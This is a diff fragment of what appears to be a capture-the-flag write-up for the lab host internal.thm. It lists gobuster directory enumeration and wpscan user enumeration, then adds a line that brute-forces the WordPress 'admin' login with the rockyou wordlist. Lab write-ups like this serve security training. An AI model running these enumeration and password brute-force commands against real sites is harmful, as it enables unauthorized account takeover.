@@ -10,3 +10,7 @@ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 
 Enumerate WordPress using wpscan, and we find the username ‘admin.’
 
 wpscan --url http://internal.thm/blog -e u
+
+bruteforce the web 
+
+wpscan --url http://internal.thm/blog -U admin -P /usr/share/wordlists/rockyou.txt
